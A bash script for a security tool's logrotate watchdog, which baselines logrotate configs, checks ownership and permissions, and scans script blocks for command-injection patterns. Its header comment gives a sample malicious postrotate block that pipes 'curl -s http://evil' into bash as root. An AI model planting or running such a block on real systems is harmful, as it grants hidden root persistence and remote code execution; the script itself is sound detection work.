#!/usr/bin/env bash
# selfdef logrotate-watchdog — boot + daily delta of the logrotate
# config vs a learned baseline + an ownership + suspicious-pattern
# scan of the script blocks.
#
# logrotate runs the prerotate / postrotate / firstaction /
# lastaction / preremove script blocks AS ROOT on each rotation
# (typically daily, via cron.daily or the systemd timer). A rogue
# script block is overlooked root-exec persistence (T1546):
#
#   /var/log/x.log {
#       postrotate
#           curl -s http://evil | bash      # runs as root, daily
#       endscript
#   }
#
# Records (each line: kind<TAB>path<TAB>value):
#   file:<path>:<sha12>      — hash of each logrotate config
#   own:<path>:<owner:mode>  — owner + mode
#   susp:<path>:<pattern>    — a high-risk exec pattern present
#
# Severity:
#   ok    → no delta
#   warn  → a config added / changed / removed
#   alert → a config world-writable or non-root-owned, OR
#           containing a suspicious command-injection pattern

set -u

PROFILE="${SELFDEF_LOGROTATE_PROFILE:-report}"
BASELINE="${SELFDEF_LOGROTATE_BASELINE:-/var/lib/selfdef/logrotate-baseline.tsv}"
CONF="${SELFDEF_LOGROTATE_FILE:-/etc/logrotate.conf}"
CONFD="${SELFDEF_LOGROTATE_D:-/etc/logrotate.d}"

# SDD-061 D-6: consume the shared injection-pattern set + writable-
# location policy from module-lib instead of a per-module copy. Co-shipped
# by the .deb at /usr/share/selfdef/lib/module-lib.sh; selfdefctl exports
# SELFDEF_MODULE_LIB in a workspace. A missing or pre-v3 library is a real
# misconfiguration that would leave the watchdog scanning with a divergent/
# absent set, so we fail loud with a structured finding.
_LIB="${SELFDEF_MODULE_LIB:-/usr/share/selfdef/lib/module-lib.sh}"
if [[ ! -r "$_LIB" ]]; then
    logger -t selfdef-logrotate -- '{"tag":"selfdef-logrotate","severity":"alert","event":"module_lib_missing","profile":"'"$PROFILE"'"}'
    exit 1
fi
# shellcheck disable=SC1090
source "$_LIB"
if [[ "${SELFDEF_MODULE_LIB_VERSION:-0}" -lt 3 ]]; then
    logger -t selfdef-logrotate -- '{"tag":"selfdef-logrotate","severity":"alert","event":"module_lib_outdated","profile":"'"$PROFILE"'"}'
    exit 1
fi
mapfile -t PATTERNS < <(selfdef_injection_patterns)

files=()
[[ -f "$CONF" ]] && files+=("$CONF")
if [[ -d "$CONFD" ]]; then
    for f in "$CONFD"/*; do [[ -f "$f" ]] && files+=("$f"); done
fi

if [[ ${#files[@]} -eq 0 ]]; then
    logger -t selfdef-logrotate -- '{"tag":"selfdef-logrotate","severity":"ok","event":"no_logrotate","profile":"'"$PROFILE"'"}'
    exit 0
fi

current="$(mktemp)"
trap 'rm -f "$current" "${current}.sorted"' EXIT

declare -a suspicious=()

for f in "${files[@]}"; do
    h=$(sha256sum "$f" 2>/dev/null | awk '{print substr($1,1,12)}')
    printf 'file\t%s\t%s\n' "$f" "$h" >> "$current"
    owner=$(stat -c '%U' "$f" 2>/dev/null || echo '?')
    mode=$(stat -c '%a' "$f" 2>/dev/null || echo '?')
    printf 'own\t%s\t%s\n' "$f" "${owner}:${mode}" >> "$current"
    if [[ "$mode" =~ [2367]$ ]]; then
        suspicious+=("$(basename "$f"):world-writable($mode)")
    elif [[ "$owner" != "${SELFDEF_WATCHDOG_EXPECTED_OWNER:-root}" && "$owner" != "?" ]]; then
        suspicious+=("$(basename "$f"):owned-by-$owner")
    fi
    # Scan the file (comment lines stripped) for injection patterns.
    scan=$(grep -vE '^[[:space:]]*#' "$f" 2>/dev/null || true)
    for pat in "${PATTERNS[@]}"; do
        if printf '%s\n' "$scan" | grep -qE "$pat"; then
            printf 'susp\t%s\t%s\n' "$f" "$pat" >> "$current"
            suspicious+=("$(basename "$f"):$pat")
        fi
    done
done

{ sort -u > "${current}.sorted"; } < "$current" && mv "${current}.sorted" "$current"
cur_count=$(wc -l < "$current" | tr -d ' ')

if (( ${#suspicious[@]} > 0 )); then
    mapfile -t suspicious < <(printf '%s\n' "${suspicious[@]}" | sort -u)
fi

if [[ ! -f "$BASELINE" ]]; then
    mkdir -p "$(dirname "$BASELINE")"
    cp "$current" "$BASELINE"
    chmod 0600 "$BASELINE"
    susp_str=$(IFS='|'; echo "${suspicious[*]:-}")
    sev="ok"; [[ ${#suspicious[@]} -gt 0 ]] && sev="alert"
    logger -t selfdef-logrotate -- "$(printf '{"tag":"selfdef-logrotate","severity":"%s","event":"baseline_initial","profile":"%s","entries":%d,"suspicious":"%s"}' "$sev" "$PROFILE" "$cur_count" "$susp_str")"
    [[ "$PROFILE" == "enforce" && "$sev" != "ok" ]] && exit 1
    exit 0
fi

added=$(comm -23 "$current" <(sort -u "$BASELINE"))
removed=$(comm -13 "$current" <(sort -u "$BASELINE"))
n_added=$(printf '%s' "$added"   | grep -c . || true)
n_removed=$(printf '%s' "$removed" | grep -c . || true)

severity="ok"; event="logrotate_intact"
if (( ${#suspicious[@]} > 0 )); then
    severity="alert"; event="logrotate_suspicious"
elif (( n_added > 0 || n_removed > 0 )); then
    severity="warn"; event="logrotate_changed"
fi

added_sample=$(printf '%s' "$added"   | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
removed_sample=$(printf '%s' "$removed" | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
susp_str=$(IFS='|'; echo "${suspicious[*]:-}")

json=$(printf '{"tag":"selfdef-logrotate","severity":"%s","event":"%s","profile":"%s","added":%d,"removed":%d,"suspicious":"%s","added_sample":"%s","removed_sample":"%s"}' \
    "$severity" "$event" "$PROFILE" "$n_added" "$n_removed" "$susp_str" "$added_sample" "$removed_sample")
logger -t selfdef-logrotate -- "$json"

[[ -n "$added" ]]   && printf '%s\n' "$added"   | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-logrotate-detail -- "ADDED ${k} ${p} ${v}"; done
[[ -n "$removed" ]] && printf '%s\n' "$removed" | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-logrotate-detail -- "REMOVED ${k} ${p} ${v}"; done

cp "$current" "$BASELINE" 2>/dev/null || true

if [[ "$PROFILE" == "enforce" && "$severity" != "ok" ]]; then
    exit 1
fi
exit 0
